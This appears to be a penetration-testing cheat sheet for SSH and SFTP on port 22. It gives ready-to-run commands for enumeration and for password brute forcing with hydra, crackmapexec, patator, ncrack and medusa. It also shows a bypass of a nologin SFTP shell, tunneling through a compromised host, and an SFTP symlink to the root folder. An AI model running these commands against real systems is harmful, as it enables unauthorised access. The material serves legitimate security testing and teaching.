# SSH/SFTP - 22

## SSH Information

The Secure Shell Protocol is a cryptographic network protocol for operating network services securely over an unsecured network. Typical applications include remote command-line, login, and remote command execution, but any network service can be secured with SSH.

**Default Port:** 22 (can be easily changed)

**SSH Services:**

* ****[openSSH](http://www.openssh.org) – OpenBSD SSH, shipped in BSD, Linux distributions, and Windows since Windows 10.
* [PuTTY](https://www.chiark.greenend.org.uk/\~sgtatham/putty/) – SSH implementation for Windows.
* [CopSSH](https://www.itefix.net/copssh) – implementation of OpenSSH for Windows.

## SSH Enumeration

### Banner Grabbing

```
nc -nv 10.10.10.10 22
```

### Weak Cipher Algorithms

Not all cipher algorithms are strong, nmap has a few scripts that enumerate this information:

```bash
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```

## SSH Authentication

We can authenticate to the default port by using `ssh` command:

```
ssh <target_username>@<target_IP>
```

We can authenticate to a specific port with `-p` option:

```
ssh <target_username>@<target_IP> -p <target_port>
```

## SSH Keys

### Public Key

First, enumerate if the server accepts public keys:

```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```

We can scan public keys with:

```
ssh-keyscan -t rsa <IP> <PORT>
```

### Private Key

If we have an authorized private key then we can authenticate to the server.

First, we must ensure that the correct permissions are in place with:

```
chmod 600 id_rsa
```

Sometimes you may use this permission instead:

```bash
chmod 400 id_rsa
```

Then we can authenticate to the server with:

```
ssh -i id_rsa <target_username>@<target_IP>
```

## SSH Certificates

SSH does provides certificates as we can see in this [gitlab doc](https://docs.gitlab.com/ee/administration/operations/ssh_certificates.html).

## SSH Brute force

Before trying to do a bruteforce try the following:

```
username:username
```

Sometimes you'll see that the password is the same as the username.

### crackmapexec <a href="#hydra" id="hydra"></a>

We can bruteforce with a list of known users:

```
crackmapexec ssh 192.168.189.39 -u username -p /usr/share/wordlists/rockyou.txt
```

### hydra <a href="#hydra" id="hydra"></a>

We can use hydra to bruteforce ssh:

```
hydra -L <username_wordlist> -P <password_wordlist> ssh://<IP>
hydra -l username -P wordlist.txt ssh://127.0.0.1
hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4
```

### patator <a href="#patator" id="patator"></a>

We can use [patator](https://github.com/lanjelot/patator) as well:

```
patator ssh_login host=<target_ip> port=<port> user=username password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed'
patator ssh_login host=<target_ip> port=22022 password=FILE0 0=/opt/SecLists/Passwords/probabable-v2-top1575.txt persistent=0
```

### ncrack <a href="#ncrack" id="ncrack"></a>

ncrack can be used too:

```
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
```

### medusa <a href="#medusa" id="medusa"></a>

medusa is another common tool that's used:

```
medusa -h <target_ip> -U <users_wordlist.txt> -P <passwords.txt> -M ssh <target_ip>
```

## SSH and Kerberos

We can use the SSH protocol and authenticate with Kerberos.

### krb5

We can use krb5 for user authentication with krb5-user:

```
sudo apt install krb5-user
```

The default configuration is in **/etc/krb5.conf** and we need to add the target realm:

```
[libdefaults]
        default_realm = REALCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
    .realcorp.htb = REALCORP.HTB
    realcorp.htb = REALCORP.HTB
```

Before getting a ticket, we should check our time offset with:

```
ntpdate -q 10.10.10.224
```

&#x20;Then we will need to synchronize our time with the server (target) time with:

```
sudo rdate -n 10.10.10.224
```

&#x20;The command to get a ticket is `kinit`.

```
user@hostname$ kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: 
```

On entering the password above, it just returns without a message, which is good (entering a bad password throws an error). Running `klist` shows there’s a ticket on my system:

```
user@hostname$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
06/09/2021 07:29:18  06/10/2021 07:26:17  krbtgt/REALCORP.HTB@REALCORP.HTB
```

Kerberos can be very picky about DNS names. You need to make sure that your name resolution file is in order that Kerberos will accept:

```
/etc/hosts
```

SSH in debugging mode to check for errors (if any):

```
 ssh j.nakazawa@10.10.10.224 -vv
```

### crackmapexec&#x20;

**crackmapexec** using the `ssh` protocol can use the option `--kerberos` to **authenticate via kerberos**.\
For more info run `crackmapexec ssh --help`.

## SSH Possible Issues Fix

Sometimes the server that we want to connect to has another encryption algorithm, to fix this use:

```
ssh -oKexAlgorithms=diffie-hellman-group1-sha1 username@192.168.1.10
```

**Example scenario**:

Unable to negotiate with x.x.x.x … no matching key exchange method found

_SSH Error:_

```
Unable to negotiate with x.x.x.x port 22: no matching key exchange method found. Their offer: 
diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

_Solution:_

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc user@x.x.x.x
```

### Load key “id\_rsa”: invalid format?

Try removing additional spaces. Also, keep the public key in the same directory as the private key. We may get the warning, but it should work.

### Permissions

Correct permission for SSH Key?

```
chmod 600 id_rsa.pub 
chmod 600 id_rsa
```

## SFTP

Secure File Transfer Protocol, as the name implies this is a mix of SSH and FTP together to encrypt the traffic.

### SFTP command execution <a href="#sftp-command-execution" id="sftp-command-execution"></a>

Another common SSH misconfiguration is often seen in SFTP configuration. Most of the time when creating a SFTP server the administrator want users to have a SFTP access to share files but not to get a remote shell on the machine. So they think that creating a user, attributing him a placeholder shell (like `/usr/bin/nologin` or `/usr/bin/false`) and chrooting him in jail is enough to avoid a shell access or abuse on the whole file system.&#x20;

However, that's wrong, **a user can ask to execute a command right after authentication before its default command or shell is executed**.&#x20;

Bypass the placeholder shell that will deny shell access, one only has to ask to execute a command (eg. `/bin/bash`) before, just by doing:

```
$ ssh -v username@192.168.29.20 id
...
Password:debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.29.20 ([192.168.29.20]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: networkdebug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0​

$ ssh username@192.168.29.20 /bin/bash
```

Here is an example of an SFTP configuration (`/etc/ssh/sshd_config` – openSSH) for the user `username`:

```
Match User username
    ChrootDirectory %h        
    ForceCommand internal-sftp        
    AllowTcpForwarding no        
    PermitTunnel no        
    X11Forwarding no        
    PermitTTY no
```

This configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kinds of port forwarding or tunneling.

### SFTP Tunneling <a href="#sftp-tunneling" id="sftp-tunneling"></a>

If you have access to an SFTP server you can also tunnel your traffic through this for example using the common port forwarding:

```
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

### SFTP Symlink <a href="#sftp-symlink" id="sftp-symlink"></a>

SFTP has the command "**symlink**". Therefore, if you have **writable rights** in some folder, you can create **symlinks** of **other folders/files**. As you are probably **trapped** inside a chroot this **won't be especially useful** for you, but, if you can **access** the created **symlink** from a **no-chroot** **service** (for example, if you can access the symlink from the web), you could **open the symlinked files through the website**.

For example, to create a **symlink** from a new file **"**_**file\_root**_**" to "**_**/**_**"**:

```
sftp> symlink / file_root
```

If you can access the file "_file\_root_" via the website, you will be able to list the root ("/") folder of the system.











